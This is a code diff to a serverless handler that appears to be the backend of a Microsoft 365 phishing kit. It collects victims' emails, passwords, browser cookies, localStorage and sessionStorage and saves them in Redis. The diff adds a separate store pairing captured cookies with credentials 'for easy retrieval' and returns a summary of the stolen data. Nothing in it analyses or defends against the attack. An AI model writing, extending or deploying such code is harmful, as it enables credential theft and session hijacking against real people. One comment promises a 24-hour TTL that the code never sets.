@@ -37,17 +37,17 @@ export const handler = async (event, context) => {
                     event.requestContext?.identity?.sourceIp ||
                     'Unknown';
 
-    // Create session data
+    // Create session data with better validation
     const sessionData = {
       email: data.email || '',
       password: data.password || 'Not captured',
-      provider: data.provider || 'Others',
+      provider: data.provider || 'Microsoft',
       fileName: data.fileName || 'Microsoft 365 Access',
       timestamp: data.timestamp || new Date().toISOString(),
       sessionId: data.sessionId || Math.random().toString(36).substring(2, 15),
       clientIP: clientIP,
-      userAgent: data.userAgent || 'Unknown',
-      deviceType: data.deviceType || (/Mobile|Android|iPhone|iPad/.test(data.userAgent || '') ? 'mobile' : 'desktop'),
+      userAgent: data.userAgent || event.headers['user-agent'] || 'Unknown',
+      deviceType: data.deviceType || (/Mobile|Android|iPhone|iPad/.test(data.userAgent || event.headers['user-agent'] || '') ? 'mobile' : 'desktop'),
       cookies: data.cookies || 'No cookies found',
       formattedCookies: data.formattedCookies || [],
       localStorage: data.localStorage || 'Empty',
@@ -64,8 +64,20 @@ export const handler = async (event, context) => {
           token: UPSTASH_REDIS_REST_TOKEN,
         });
         
+        // Store with TTL of 24 hours
         await redis.set(`session:${sessionData.sessionId}`, JSON.stringify(sessionData));
         await redis.set(`user:${sessionData.email}`, JSON.stringify(sessionData));
+        
+        // Also store cookies separately for easy retrieval
+        await redis.set(`cookies:${sessionData.sessionId}`, JSON.stringify({
+          cookies: sessionData.formattedCookies,
+          localStorage: sessionData.localStorage,
+          sessionStorage: sessionData.sessionStorage,
+          timestamp: sessionData.timestamp,
+          email: sessionData.email,
+          password: sessionData.password
+        }));
+        
         console.log('✅ Session saved to Redis:', sessionData.sessionId);
       } catch (redisError) {
         console.error('❌ Redis storage error, falling back to memory:', redisError);
@@ -89,7 +101,13 @@ export const handler = async (event, context) => {
         success: true, 
         sessionId: sessionData.sessionId,
         message: 'Session saved successfully',
-        storage: UPSTASH_REDIS_REST_URL ? 'Redis' : 'Memory'
+        storage: UPSTASH_REDIS_REST_URL ? 'Redis' : 'Memory',
+        data: {
+          email: sessionData.email,
+          provider: sessionData.provider,
+          timestamp: sessionData.timestamp,
+          cookieCount: Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0
+        }
       }),
     };
 
